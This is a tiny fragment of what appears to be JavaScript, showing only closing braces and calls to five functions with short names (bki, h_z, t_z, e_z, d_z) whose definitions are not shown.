                    }
}
bki();

h_z();
t_z();
e_z();
d_z();

  
